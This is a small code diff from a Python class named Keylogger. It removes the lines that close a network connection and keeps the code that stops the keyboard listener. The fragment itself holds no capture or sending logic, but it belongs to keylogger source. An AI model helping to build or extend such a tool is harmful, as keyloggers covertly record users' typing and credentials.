@@ -32,8 +32,5 @@ class Keylogger:
                 # Stop the keyboard listener
                 self.listener.stop()
                 self.listener.join()
-            if self.conn:
-                # Close the connection
-                self.conn.close()
         except Exception as e:
             print(f"Error while stopping: {e}")
